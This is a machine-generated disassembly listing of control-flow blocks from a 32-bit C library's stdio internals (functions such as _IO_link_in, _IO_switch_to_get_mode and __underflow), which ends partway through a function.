0xb0701e3:	mov	dword ptr [esp + 0x10], eax
0xb0701e7:	mov	dword ptr [esp + 0x14], 0
0xb0701ef:	mov	edx, dword ptr gs:[8]
0xb0701f6:	cmp	edx, dword ptr [ebx + 0x1888]
0xb0701fc:	je	0xb070223
None
|
|
|
v
0xb071db9:	jmp	0xb07038b
None
|
|
|
v
0xb0701cf:	mov	edi, dword ptr [ebx + 0x38d8]
0xb0701d5:	test	edi, edi
0xb0701d7:	jne	0xb070340
None
|
|
|
v
0xb0701ef:	mov	edx, dword ptr gs:[8]
0xb0701f6:	cmp	edx, dword ptr [ebx + 0x1888]
0xb0701fc:	je	0xb070223
None
|
|
|
v
0xb070385:	jne	0xb071db2
None
|
|
|
v
0xb070259:	lock cmpxchg	dword ptr [edx], ecx
0xb07025d:	jne	0xb071d96
None
|
|
|
v
0xb070331:	add	esp, 0x2c
0xb070334:	pop	ebx
0xb070335:	pop	esi
0xb070336:	pop	edi
0xb070337:	pop	ebp
0xb070338:	ret	
None
|
|
|
v
0xb0701b0:	push	ebp
0xb0701b1:	push	edi
0xb0701b2:	push	esi
0xb0701b3:	push	ebx
0xb0701b4:	sub	esp, 0x2c
0xb0701b7:	mov	esi, dword ptr [esp + 0x40]
0xb0701bb:	call	0xb1267db
None
|
|
|
v
0xb07038b:	jmp	0xb0702cb
None
|
|
|
v
0xb07023b:	mov	edx, dword ptr [esi + 0x48]
0xb07023e:	mov	ebp, dword ptr gs:[8]
0xb070245:	cmp	ebp, dword ptr [edx + 8]
0xb070248:	je	0xb07026c
None
|
|
|
v
0xb07036b:	jmp	0xb0701ef
None
|
|
|
v
0xb0703bd:	lea	ecx, dword ptr [edx + 0x34]
0xb0703c0:	jmp	0xb070393
None
|
|
|
v
0xb07021d:	mov	dword ptr [ebx + 0x1888], edx
0xb070223:	mov	ebp, dword ptr [esi]
0xb070225:	add	dword ptr [ebx + 0x1884], 1
0xb07022c:	mov	dword ptr [ebx + 0x1878], esi
0xb070232:	mov	eax, ebp
0xb070234:	and	eax, 0x8000
0xb070239:	jne	0xb070279
None
|
|
|
v
0xb071d96:	lea	ecx, dword ptr [edx]
0xb071d98:	call	0xb0f9430
None
|
|
|
v
0xb0702aa:	mov	edx, dword ptr [ecx + 0x34]
0xb0702ad:	test	edx, edx
0xb0702af:	nop	
0xb0702b0:	jne	0xb0702a0
None
|
|
|
v
0xb070300:	test	edi, edi
0xb070302:	jne	0xb070310
None
|
|
|
v
0xb0702be:	mov	edx, dword ptr [esi + 0x48]
0xb0702c1:	sub	dword ptr [edx + 4], 1
0xb0702c5:	je	0xb070370
None
|
|
|
v
0xb070223:	mov	ebp, dword ptr [esi]
0xb070225:	add	dword ptr [ebx + 0x1884], 1
0xb07022c:	mov	dword ptr [ebx + 0x1878], esi
0xb070232:	mov	eax, ebp
0xb070234:	and	eax, 0x8000
0xb070239:	jne	0xb070279
None
|
|
|
v
0xb071d91:	jmp	0xb07021d
None
|
|
|
v
0xb0702b2:	and	ebp, 0xffffff7f
0xb0702b8:	test	eax, eax
0xb0702ba:	mov	dword ptr [esi], ebp
0xb0702bc:	jne	0xb0702cb
None
|
|
|
v
0xb071d86:	lea	ecx, dword ptr [ebx + 0x1880]
0xb071d8c:	call	0xb0f9430
None
|
|
|
v
0xb070393:	mov	edx, dword ptr [esi + 0x34]
0xb070396:	add	dword ptr [ebx + 0x187c], 1
0xb07039d:	mov	dword ptr [ecx], edx
0xb07039f:	jmp	0xb0702b2
None
|
|
|
v
0xb0702a8:	mov	ecx, edx
0xb0702aa:	mov	edx, dword ptr [ecx + 0x34]
0xb0702ad:	test	edx, edx
0xb0702af:	nop	
0xb0702b0:	jne	0xb0702a0
None
|
|
|
v
0xb070381:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb071dad:	jmp	0xb070300
None
|
|
|
v
0xb07024a:	mov	ecx, 1
0xb07024f:	cmp	dword ptr gs:[0xc], 0
0xb070257:	je	0xb07025a
None
|
|
|
v
0xb0701fe:	xor	eax, eax
0xb070200:	mov	ecx, 1
0xb070205:	cmp	dword ptr gs:[0xc], 0
0xb07020d:	je	0xb070210
None
|
|
|
v
0xb07020f:	lock cmpxchg	dword ptr [ebx + 0x1880], ecx
0xb070217:	jne	0xb071d86
None
|
|
|
v
0xb07026c:	mov	ebp, dword ptr [esi]
0xb07026e:	add	dword ptr [edx + 4], 1
0xb070272:	mov	eax, ebp
0xb070274:	and	eax, 0x8000
0xb070279:	mov	edx, dword ptr [ebx + 0x940]
0xb07027f:	test	edx, edx
0xb070281:	je	0xb0702b2
None
|
|
|
v
0xb0702cb:	sub	dword ptr [ebx + 0x1884], 1
0xb0702d2:	mov	dword ptr [ebx + 0x1878], 0
0xb0702dc:	jne	0xb070300
None
|
|
|
v
0xb07028b:	mov	ecx, dword ptr [edx + 0x34]
0xb07028e:	test	ecx, ecx
0xb070290:	je	0xb0702b2
None
|
|
|
v
0xb0702fa:	jne	0xb071da2
None
|
|
|
v
0xb0701c0:	add	ebx, 0x13ae40
0xb0701c6:	test	byte ptr [esi], 0x80
0xb0701c9:	je	0xb070304
None
|
|
|
v
0xb0703a8:	mov	edx, dword ptr [esi + 0x34]
0xb0703ab:	add	dword ptr [ebx + 0x187c], 1
0xb0703b2:	mov	dword ptr [ebx + 0x940], edx
0xb0703b8:	jmp	0xb0702b2
None
|
|
|
v
0xb070340:	lea	edx, dword ptr [ebx - 0x13aec0]
0xb070346:	mov	eax, dword ptr [ebx + 0x38b8]
0xb07034c:	mov	dword ptr [esp + 4], edx
0xb070350:	lea	edx, dword ptr [esp + 0x10]
0xb070354:	ror	eax, 9
0xb070357:	xor	eax, dword ptr gs:[0x18]
0xb07035e:	mov	dword ptr [esp + 8], 0
0xb070366:	mov	dword ptr [esp], edx
0xb070369:	call	eax
None
|
|
|
v
0xb070296:	jmp	0xb0703bd
None
|
|
|
v
0xb070283:	cmp	esi, edx
0xb070285:	je	0xb0703a8
None
|
|
|
v
0xb070390:	add	ecx, 0x34
0xb070393:	mov	edx, dword ptr [esi + 0x34]
0xb070396:	add	dword ptr [ebx + 0x187c], 1
0xb07039d:	mov	dword ptr [ecx], edx
0xb07039f:	jmp	0xb0702b2
None
|
|
|
v
0xb070310:	lea	edx, dword ptr [esp + 0x10]
0xb070314:	mov	eax, dword ptr [ebx + 0x38bc]
0xb07031a:	mov	dword ptr [esp + 4], 0
0xb070322:	mov	dword ptr [esp], edx
0xb070325:	ror	eax, 9
0xb070328:	xor	eax, dword ptr gs:[0x18]
0xb07032f:	call	eax
None
|
|
|
v
0xb0702f2:	lock sub	dword ptr [ebx + 0x1880], 1
None
|
|
|
v
0xb0702a0:	cmp	esi, edx
0xb0702a2:	je	0xb070390
None
|
|
|
v
0xb071d9d:	jmp	0xb070263
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_link_in
TOTAL BLOCKS :39
0xb0704e7:	mov	dword ptr [ebx + 0x1888], 0
0xb0704f1:	cmp	dword ptr gs:[0xc], 0
0xb0704f9:	je	0xb0704fc
None
|
|
|
v
0xb070509:	test	edi, edi
0xb07050b:	jne	0xb070530
None
|
|
|
v
0xb071dea:	lea	eax, dword ptr [edx]
0xb071dec:	call	0xb0f9460
None
|
|
|
v
0xb0704d0:	sub	edx, 1
0xb0704d3:	test	edx, edx
0xb0704d5:	mov	dword ptr [ebx + 0x1878], 0
0xb0704df:	mov	dword ptr [ebx + 0x1884], edx
0xb0704e5:	jne	0xb070509
None
|
|
|
v
0xb071dbe:	lea	ecx, dword ptr [ebx + 0x1880]
0xb071dc4:	call	0xb0f9430
None
|
|
|
v
0xb0705a1:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb07050d:	add	esp, 0x2c
0xb070510:	pop	ebx
0xb070511:	pop	esi
0xb070512:	pop	edi
0xb070513:	pop	ebp
0xb070514:	ret	
None
|
|
|
v
0xb070448:	mov	edx, dword ptr [ebx + 0x1884]
0xb07044e:	mov	ecx, dword ptr [esi]
0xb070450:	mov	dword ptr [ebx + 0x1878], esi
0xb070456:	lea	eax, dword ptr [edx + 1]
0xb070459:	mov	edx, eax
0xb07045b:	mov	dword ptr [ebx + 0x1884], eax
0xb070461:	mov	eax, ecx
0xb070463:	and	eax, 0x8000
0xb070468:	jne	0xb070518
None
|
|
|
v
0xb0703f0:	mov	edi, dword ptr [ebx + 0x38d8]
0xb0703f6:	or	al, 0x80
0xb0703f8:	mov	dword ptr [esi], eax
0xb0703fa:	test	edi, edi
0xb0703fc:	jne	0xb070560
None
|
|
|
v
0xb071de5:	jmp	0xb070509
None
|
|
|
v
0xb070590:	mov	dword ptr [edx + 8], 0
0xb070597:	cmp	dword ptr gs:[0xc], 0
0xb07059f:	je	0xb0705a2
None
|
|
|
v
0xb071df1:	jmp	0xb0705ab
None
|
|
|
v
0xb07058b:	jmp	0xb070414
None
|
|
|
v
0xb0705a5:	jne	0xb071dea
None
|
|
|
v
0xb071dce:	lea	ecx, dword ptr [edx]
0xb071dd0:	call	0xb0f9430
None
|
|
|
v
0xb070530:	lea	edx, dword ptr [esp + 0x10]
0xb070534:	mov	eax, dword ptr [ebx + 0x38bc]
0xb07053a:	mov	dword ptr [esp + 4], 0
0xb070542:	mov	dword ptr [esp], edx
0xb070545:	ror	eax, 9
0xb070548:	xor	eax, dword ptr gs:[0x18]
0xb07054f:	call	eax
None
|
|
|
v
0xb070560:	lea	edx, dword ptr [ebx - 0x13aec0]
0xb070566:	mov	eax, dword ptr [ebx + 0x38b8]
0xb07056c:	mov	dword ptr [esp + 4], edx
0xb070570:	lea	edx, dword ptr [esp + 0x10]
0xb070574:	ror	eax, 9
0xb070577:	xor	eax, dword ptr gs:[0x18]
0xb07057e:	mov	dword ptr [esp + 8], 0
0xb070586:	mov	dword ptr [esp], edx
0xb070589:	call	eax
None
|
|
|
v
0xb07046e:	mov	edx, dword ptr [esi + 0x48]
0xb070471:	mov	ebp, dword ptr gs:[8]
0xb070478:	cmp	ebp, dword ptr [edx + 8]
0xb07047b:	je	0xb0704a1
None
|
|
|
v
0xb070442:	mov	dword ptr [ebx + 0x1888], edx
0xb070448:	mov	edx, dword ptr [ebx + 0x1884]
0xb07044e:	mov	ecx, dword ptr [esi]
0xb070450:	mov	dword ptr [ebx + 0x1878], esi
0xb070456:	lea	eax, dword ptr [edx + 1]
0xb070459:	mov	edx, eax
0xb07045b:	mov	dword ptr [ebx + 0x1884], eax
0xb070461:	mov	eax, ecx
0xb070463:	and	eax, 0x8000
0xb070468:	jne	0xb070518
None
|
|
|
v
0xb070503:	jne	0xb071dda
None
|
|
|
v
0xb07048c:	lock cmpxchg	dword ptr [edx], ecx
0xb070490:	jne	0xb071dce
None
|
|
|
v
0xb0704ca:	mov	edx, dword ptr [ebx + 0x1884]
0xb0704d0:	sub	edx, 1
0xb0704d3:	test	edx, edx
0xb0704d5:	mov	dword ptr [ebx + 0x1878], 0
0xb0704df:	mov	dword ptr [ebx + 0x1884], edx
0xb0704e5:	jne	0xb070509
None
|
|
|
v
0xb070423:	xor	eax, eax
0xb070425:	mov	ecx, 1
0xb07042a:	cmp	dword ptr gs:[0xc], 0
0xb070432:	je	0xb070435
None
|
|
|
v
0xb070551:	add	esp, 0x2c
0xb070554:	pop	ebx
0xb070555:	pop	esi
0xb070556:	pop	edi
0xb070557:	pop	ebp
0xb070558:	ret	
None
|
|
|
v
0xb0703d0:	push	ebp
0xb0703d1:	push	edi
0xb0703d2:	push	esi
0xb0703d3:	push	ebx
0xb0703d4:	sub	esp, 0x2c
0xb0703d7:	mov	esi, dword ptr [esp + 0x40]
0xb0703db:	call	0xb1267db
None
|
|
|
v
0xb0705ab:	jmp	0xb0704ca
None
|
|
|
v
0xb070518:	mov	eax, dword ptr [ebx + 0x940]
0xb07051e:	add	dword ptr [ebx + 0x187c], 1
0xb070525:	mov	dword ptr [ebx + 0x940], esi
0xb07052b:	mov	dword ptr [esi + 0x34], eax
0xb07052e:	jmp	0xb0704d0
None
|
|
|
v
0xb071dda:	lea	eax, dword ptr [ebx + 0x1880]
0xb071de0:	call	0xb0f9460
None
|
|
|
v
0xb0704c0:	sub	dword ptr [edx + 4], 1
0xb0704c4:	je	0xb070590
None
|
|
|
v
0xb071dc9:	jmp	0xb070442
None
|
|
|
v
0xb0704fb:	lock sub	dword ptr [ebx + 0x1880], 1
None
|
|
|
v
0xb070496:	mov	eax, dword ptr [esi + 0x48]
0xb070499:	mov	edx, dword ptr [esi + 0x48]
0xb07049c:	mov	ecx, dword ptr [esi]
0xb07049e:	mov	dword ptr [eax + 8], ebp
0xb0704a1:	mov	eax, dword ptr [ebx + 0x940]
0xb0704a7:	add	dword ptr [edx + 4], 1
0xb0704ab:	add	dword ptr [ebx + 0x187c], 1
0xb0704b2:	and	ch, 0x80
0xb0704b5:	mov	dword ptr [esi + 0x34], eax
0xb0704b8:	mov	dword ptr [ebx + 0x940], esi
0xb0704be:	jne	0xb0704ca
None
|
|
|
v
0xb07047d:	mov	ecx, 1
0xb070482:	cmp	dword ptr gs:[0xc], 0
0xb07048a:	je	0xb07048d
None
|
|
|
v
0xb070402:	lea	eax, dword ptr [ebx - 0x13aec0]
0xb070408:	mov	dword ptr [esp + 0x10], eax
0xb07040c:	mov	dword ptr [esp + 0x14], 0
0xb070414:	mov	edx, dword ptr gs:[8]
0xb07041b:	cmp	edx, dword ptr [ebx + 0x1888]
0xb070421:	je	0xb070448
None
|
|
|
v
0xb0703e0:	add	ebx, 0x13ac20
0xb0703e6:	mov	eax, dword ptr [esi]
0xb0703e8:	test	al, 0x80
0xb0703ea:	jne	0xb07050d
None
|
|
|
v
0xb071dd5:	jmp	0xb070496
None
|
|
|
v
0xb070414:	mov	edx, dword ptr gs:[8]
0xb07041b:	cmp	edx, dword ptr [ebx + 0x1888]
0xb070421:	je	0xb070448
None
|
|
|
v
0xb070434:	lock cmpxchg	dword ptr [ebx + 0x1880], ecx
0xb07043c:	jne	0xb071dbe
None
|
|
|
v
0xb0704a1:	mov	eax, dword ptr [ebx + 0x940]
0xb0704a7:	add	dword ptr [edx + 4], 1
0xb0704ab:	add	dword ptr [ebx + 0x187c], 1
0xb0704b2:	and	ch, 0x80
0xb0704b5:	mov	dword ptr [esi + 0x34], eax
0xb0704b8:	mov	dword ptr [ebx + 0x940], esi
0xb0704be:	jne	0xb0704ca
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0705b0
TOTAL BLOCKS :4
0xb0705c8:	mov	ecx, dword ptr [edx + 8]
0xb0705cb:	mov	edx, dword ptr [edx]
0xb0705cd:	cmp	eax, ecx
0xb0705cf:	cmovg	eax, ecx
0xb0705d2:	test	edx, edx
0xb0705d4:	jne	0xb0705c8
None
|
|
|
v
0xb0705d6:	ret	
None
|
|
|
v
0xb0705c2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0705b0:	mov	edx, dword ptr [esp + 4]
0xb0705b4:	mov	eax, dword ptr [esp + 8]
0xb0705b8:	sub	eax, dword ptr [edx + 0xc]
0xb0705bb:	mov	edx, dword ptr [edx + 0x30]
0xb0705be:	test	edx, edx
0xb0705c0:	je	0xb0705d6
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0705e0
TOTAL BLOCKS :27
0xb0706fa:	mov	ecx, dword ptr [esp + 0x18]
0xb0706fe:	sub	ebp, dword ptr [esi + 0xc]
0xb070701:	add	ecx, dword ptr [esi + 0x24]
0xb070704:	jmp	0xb070643
None
|
|
|
v
0xb070602:	mov	edx, eax
0xb070604:	mov	eax, dword ptr [esi + 0xc]
0xb070607:	mov	edi, eax
0xb070609:	mov	dword ptr [esp + 0x1c], eax
0xb07060d:	mov	eax, ebp
0xb07060f:	sub	eax, edi
0xb070611:	mov	edi, eax
0xb070613:	mov	dword ptr [esp + 0x18], eax
0xb070617:	mov	eax, dword ptr [esi + 0x2c]
0xb07061a:	sub	edi, edx
0xb07061c:	mov	ecx, eax
0xb07061e:	mov	dword ptr [esp + 0x20], eax
0xb070622:	mov	eax, dword ptr [esi + 0x24]
0xb070625:	sub	ecx, eax
0xb070627:	cmp	edi, ecx
0xb070629:	ja	0xb070668
None
|
|
|
v
0xb070687:	mov	edx, dword ptr [esp + 0x2c]
0xb07068b:	test	edx, edx
0xb07068d:	js	0xb070764
None
|
|
|
v
0xb07072d:	mov	ecx, dword ptr [esp + 0x18]
0xb070731:	mov	edx, dword ptr [esp + 0x1c]
0xb070735:	mov	eax, dword ptr [esi + 0xc]
0xb070738:	mov	edi, ecx
0xb07073a:	sub	edi, edx
0xb07073c:	mov	edx, dword ptr [esi + 0x24]
0xb07073f:	mov	dword ptr [esp + 4], eax
0xb070743:	add	edx, edi
0xb070745:	mov	edi, ebp
0xb070747:	sub	edi, eax
0xb070749:	mov	dword ptr [esp + 8], edi
0xb07074d:	mov	dword ptr [esp], edx
0xb070750:	call	0xb07d0b0
None
|
|
|
v
0xb070797:	mov	ecx, edi
0xb070799:	jmp	0xb0706b6
None
|
|
|
v
0xb070659:	xor	eax, eax
0xb07065b:	add	esp, 0x3c
0xb07065e:	pop	ebx
0xb07065f:	pop	esi
0xb070660:	pop	edi
0xb070661:	pop	ebp
0xb070662:	ret	
None
|
|
|
v
0xb070755:	mov	ecx, dword ptr [esp + 0x18]
0xb070759:	sub	ebp, dword ptr [esi + 0xc]
0xb07075c:	add	ecx, dword ptr [esi + 0x24]
0xb07075f:	jmp	0xb070643
None
|
|
|
v
0xb07077f:	mov	edx, dword ptr [esp + 0x18]
0xb070783:	mov	dword ptr [esp + 8], edx
0xb070787:	mov	edx, dword ptr [esp + 0x1c]
0xb07078b:	mov	dword ptr [esp], eax
0xb07078e:	mov	dword ptr [esp + 4], edx
0xb070792:	call	0xb07d0b0
None
|
|
|
v
0xb070709:	mov	edi, edx
0xb07070b:	add	eax, ecx
0xb07070d:	neg	edi
0xb07070f:	mov	dword ptr [esp + 8], edi
0xb070713:	mov	edi, dword ptr [esp + 0x20]
0xb070717:	mov	dword ptr [esp], eax
0xb07071a:	mov	dword ptr [esp + 0x1c], edx
0xb07071e:	mov	dword ptr [esp + 0x18], ecx
0xb070722:	add	edi, edx
0xb070724:	mov	dword ptr [esp + 4], edi
0xb070728:	call	0xb07c960
None
|
|
|
v
0xb07065b:	add	esp, 0x3c
0xb07065e:	pop	ebx
0xb07065f:	pop	esi
0xb070660:	pop	edi
0xb070661:	pop	ebp
0xb070662:	ret	
None
|
|
|
v
0xb0706b2:	mov	ecx, dword ptr [esp + 0x18]
0xb0706b6:	mov	eax, dword ptr [esi + 0x24]
0xb0706b9:	mov	dword ptr [esp + 0x18], ecx
0xb0706bd:	mov	dword ptr [esp], eax
0xb0706c0:	call	0xb017470
None
|
|
|
v
0xb07062b:	sub	ecx, edi
0xb07062d:	test	edx, edx
0xb07062f:	js	0xb070709
None
|
|
|
v
0xb0706e0:	add	edx, dword ptr [esp + 0x1c]
0xb0706e4:	add	eax, ecx
0xb0706e6:	mov	dword ptr [esp + 8], edi
0xb0706ea:	mov	dword ptr [esp], eax
0xb0706ed:	mov	dword ptr [esp + 4], edx
0xb0706f1:	mov	dword ptr [esp + 0x18], ecx
0xb0706f5:	call	0xb07d0b0
None
|
|
|
v
0xb070650:	sub	dword ptr [eax + 8], ebp
0xb070653:	mov	eax, dword ptr [eax]
0xb070655:	test	eax, eax
0xb070657:	jne	0xb070650
None
|
|
|
v
0xb0705e0:	push	ebp
0xb0705e1:	mov	ebp, edx
0xb0705e3:	push	edi
0xb0705e4:	push	esi
0xb0705e5:	mov	esi, eax
0xb0705e7:	push	ebx
0xb0705e8:	call	0xb1267db
None
|
|
|
v
0xb07067b:	test	eax, eax
0xb07067d:	mov	dword ptr [esp + 0x24], eax
0xb070681:	je	0xb07079e
None
|
|
|
v
0xb070635:	test	edi, edi
0xb070637:	jne	0xb0706e0
None
|
|
|
v
0xb07079e:	mov	eax, 0xffffffff
0xb0707a3:	jmp	0xb07065b
None
|
|
|
v
0xb0706c5:	mov	eax, dword ptr [esp + 0x24]
0xb0706c9:	sub	ebp, dword ptr [esi + 0xc]
0xb0706cc:	mov	ecx, dword ptr [esp + 0x18]
0xb0706d0:	mov	dword ptr [esi + 0x24], eax
0xb0706d3:	add	eax, dword ptr [esp + 0x28]
0xb0706d7:	mov	dword ptr [esi + 0x2c], eax
0xb0706da:	jmp	0xb070643
None
|
|
|
v
0xb070693:	mov	eax, dword ptr [esp + 0x24]
0xb070697:	add	edx, dword ptr [esp + 0x1c]
0xb07069b:	mov	dword ptr [esp + 8], edi
0xb07069f:	lea	ecx, dword ptr [eax + 0x64]
0xb0706a2:	mov	dword ptr [esp], ecx
0xb0706a5:	mov	dword ptr [esp + 4], edx
0xb0706a9:	mov	dword ptr [esp + 0x18], ecx
0xb0706ad:	call	0xb07d0b0
None
|
|
|
v
0xb07064d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb070643:	mov	eax, dword ptr [esi + 0x30]
0xb070646:	mov	dword ptr [esi + 0x28], ecx
0xb070649:	test	eax, eax
0xb07064b:	je	0xb070659
None
|
|
|
v
0xb0706b6:	mov	eax, dword ptr [esi + 0x24]
0xb0706b9:	mov	dword ptr [esp + 0x18], ecx
0xb0706bd:	mov	dword ptr [esp], eax
0xb0706c0:	call	0xb017470
None
|
|
|
v
0xb070764:	lea	edi, dword ptr [eax + 0x64]
0xb070767:	mov	eax, edx
0xb070769:	add	edx, dword ptr [esp + 0x20]
0xb07076d:	neg	eax
0xb07076f:	mov	dword ptr [esp + 8], eax
0xb070773:	mov	dword ptr [esp], edi
0xb070776:	mov	dword ptr [esp + 4], edx
0xb07077a:	call	0xb07cad0
None
|
|
|
v
0xb070668:	lea	eax, dword ptr [edi + 0x64]
0xb07066b:	mov	dword ptr [esp], eax
0xb07066e:	mov	dword ptr [esp + 0x2c], edx
0xb070672:	mov	dword ptr [esp + 0x28], eax
0xb070676:	call	0xb0173f0
None
|
|
|
v
0xb0705ed:	add	ebx, 0x13aa13
0xb0705f3:	sub	esp, 0x3c
0xb0705f6:	mov	dword ptr [esp + 4], edx
0xb0705fa:	mov	dword ptr [esp], eax
0xb0705fd:	call	0xb0705b0
None
|
|
|
v
0xb07063d:	mov	ebp, dword ptr [esp + 0x18]
0xb070641:	add	ecx, eax
0xb070643:	mov	eax, dword ptr [esi + 0x30]
0xb070646:	mov	dword ptr [esi + 0x28], ecx
0xb070649:	test	eax, eax
0xb07064b:	je	0xb070659
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0707b0
TOTAL BLOCKS :1
0xb0707b0:	mov	eax, dword ptr [esp + 4]
0xb0707b4:	mov	edx, dword ptr [eax + 8]
0xb0707b7:	mov	ecx, dword ptr [eax + 0x2c]
0xb0707ba:	and	dword ptr [eax], 0xfffffeff
0xb0707c0:	mov	dword ptr [eax + 0x2c], edx
0xb0707c3:	mov	edx, dword ptr [eax + 0x24]
0xb0707c6:	mov	dword ptr [eax + 8], ecx
0xb0707c9:	mov	ecx, dword ptr [eax + 0xc]
0xb0707cc:	mov	dword ptr [eax + 4], edx
0xb0707cf:	mov	dword ptr [eax + 0xc], edx
0xb0707d2:	mov	dword ptr [eax + 0x24], ecx
0xb0707d5:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_switch_to_get_mode
TOTAL BLOCKS :10
0xb070871:	cmp	eax, 0xff
0xb070874:	je	0xb070845
None
|
|
|
v
0xb070810:	push	esi
0xb070811:	sub	esp, 0x18
0xb070814:	mov	esi, dword ptr [esp + 0x20]
0xb070818:	mov	eax, dword ptr [esi + 0x14]
0xb07081b:	cmp	eax, dword ptr [esi + 0x10]
0xb07081e:	ja	0xb070858
None
|
|
|
v
0xb070835:	and	dh, 0xf7
0xb070838:	mov	dword ptr [esi + 4], eax
0xb07083b:	mov	dword ptr [esi + 0x18], eax
0xb07083e:	mov	dword ptr [esi + 0x10], eax
0xb070841:	xor	eax, eax
0xb070843:	mov	dword ptr [esi], edx
0xb070845:	add	esp, 0x18
0xb070848:	pop	esi
0xb070849:	ret	
None
|
|
|
v
0xb070832:	mov	dword ptr [esi + 8], eax
0xb070835:	and	dh, 0xf7
0xb070838:	mov	dword ptr [esi + 4], eax
0xb07083b:	mov	dword ptr [esi + 0x18], eax
0xb07083e:	mov	dword ptr [esi + 0x10], eax
0xb070841:	xor	eax, eax
0xb070843:	mov	dword ptr [esi], edx
0xb070845:	add	esp, 0x18
0xb070848:	pop	esi
0xb070849:	ret	
None
|
|
|
v
0xb070850:	mov	ecx, dword ptr [esi + 0x28]
0xb070853:	mov	dword ptr [esi + 0xc], ecx
0xb070856:	jmp	0xb070835
None
|
|
|
v
0xb070820:	mov	edx, dword ptr [esi]
0xb070822:	test	dh, 1
0xb070825:	jne	0xb070850
None
|
|
|
v
0xb070858:	movsx	eax, byte ptr [esi + 0x46]
0xb07085c:	mov	eax, dword ptr [esi + eax + 0x94]
0xb070863:	mov	dword ptr [esp + 4], 0xffffffff
0xb07086b:	mov	dword ptr [esp], esi
0xb07086e:	call	dword ptr [eax + 0xc]
None
|
|
|
v
0xb070876:	mov	eax, dword ptr [esi + 0x14]
0xb070879:	jmp	0xb070820
None
|
|
|
v
0xb070827:	mov	ecx, dword ptr [esi + 0x1c]
0xb07082a:	cmp	dword ptr [esi + 8], eax
0xb07082d:	mov	dword ptr [esi + 0xc], ecx
0xb070830:	jae	0xb070835
None
|
|
|
v
0xb070845:	add	esp, 0x18
0xb070848:	pop	esi
0xb070849:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_free_backup_area
TOTAL BLOCKS :5
0xb070880:	push	esi
0xb070881:	push	ebx
0xb070882:	sub	esp, 0x14
0xb070885:	mov	esi, dword ptr [esp + 0x20]
0xb070889:	call	0xb1267db
None
|
|
|
v
0xb07089c:	mov	dword ptr [esp], esi
0xb07089f:	call	0xb0707b0
None
|
|
|
v
0xb0708af:	mov	dword ptr [esi + 0x24], 0
0xb0708b6:	mov	dword ptr [esi + 0x2c], 0
0xb0708bd:	mov	dword ptr [esi + 0x28], 0
0xb0708c4:	add	esp, 0x14
0xb0708c7:	pop	ebx
0xb0708c8:	pop	esi
0xb0708c9:	ret	
None
|
|
|
v
0xb0708a4:	mov	eax, dword ptr [esi + 0x24]
0xb0708a7:	mov	dword ptr [esp], eax
0xb0708aa:	call	0xb017470
None
|
|
|
v
0xb07088e:	add	ebx, 0x13a772
0xb070894:	test	dword ptr [esi], 0x100
0xb07089a:	je	0xb0708a4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__underflow
TOTAL BLOCKS :34
0xb070a50:	mov	eax, dword ptr [esi + 0x24]
0xb070a53:	test	eax, eax
0xb070a55:	je	0xb0709aa
None
|
|
|
v
0xb07096a:	mov	eax, dword ptr [esi + 0x68]
0xb07096d:	test	eax, eax
0xb07096f:	je	0xb0709c8
None
|
|
|
v
0xb0709d6:	test	dword ptr [esi], 0x800
0xb0709dc:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb0709e3:	je	0xb070979
None
|
|
|
v
0xb070a0f:	nop	
None
|
|
|
v
0xb070a28:	mov	dword ptr [esp], esi
0xb070a2b:	call	0xb0707b0
None
|
|
|
v
0xb070958:	mov	eax, dword ptr [esi + 0x68]
0xb07095b:	test	eax, eax
0xb07095d:	jne	0xb070a10
None
|
|
|
v
0xb070a68:	mov	dword ptr [esp + 4], 0xffffffff
0xb070a70:	mov	dword ptr [esp], esi
0xb070a73:	call	0xb066ae0
None
|
|
|
v
0xb070a1c:	jmp	0xb070971
None
|
|
|
v
0xb07093e:	add	ebx, 0x13a6c2
0xb070944:	cmp	byte ptr [esi + 0x46], 0
0xb070948:	jne	0xb07096a
None
|
|
|
v
0xb070a3c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0709aa:	movsx	eax, byte ptr [esi + 0x46]
0xb0709ae:	mov	eax, dword ptr [esi + eax + 0x94]
0xb0709b5:	mov	dword ptr [esp], esi
0xb0709b8:	call	dword ptr [eax + 0x10]
None
|
|
|
v
0xb070985:	test	dword ptr [esi], 0x100
0xb07098b:	jne	0xb070a28
None
|
|
|
v
0xb070991:	mov	edx, dword ptr [esi + 0x30]
0xb070994:	test	edx, edx
0xb070996:	je	0xb070a50
None
|
|
|
v
0xb0709bb:	add	esp, 0x14
0xb0709be:	pop	ebx
0xb0709bf:	pop	esi
0xb0709c0:	ret	
None
|
|
|
v
0xb07094a:	mov	eax, dword ptr [ebx - 0xf8]
0xb070950:	test	eax, eax
0xb070952:	je	0xb0709ff
None
|
|
|
v
0xb07099c:	mov	edx, dword ptr [esi + 8]
0xb07099f:	mov	eax, esi
0xb0709a1:	call	0xb0705e0
None
|
|
|
v
0xb070a40:	movzx	eax, byte ptr [eax]
0xb070a43:	add	esp, 0x14
0xb070a46:	pop	ebx
0xb070a47:	pop	esi
0xb070a48:	ret	
None
|
|
|
v
0xb070930:	push	esi
0xb070931:	push	ebx
0xb070932:	sub	esp, 0x14
0xb070935:	mov	esi, dword ptr [esp + 0x20]
0xb070939:	call	0xb1267db
None
|
|
|
v
0xb070a63:	jmp	0xb0709aa
None
|
|
|
v
0xb0709f8:	mov	eax, 0xffffffff
0xb0709fd:	jmp	0xb0709bb
None
|
|
|
v
0xb0709a6:	test	eax, eax
0xb0709a8:	jne	0xb0709f8
None
|
|
|
v
0xb070a78:	jmp	0xb070971
None
|
|
|
v
0xb0709ff:	mov	dword ptr [esp + 4], 0xffffffff
0xb070a07:	mov	dword ptr [esp], esi
0xb070a0a:	call	0xb066ae0
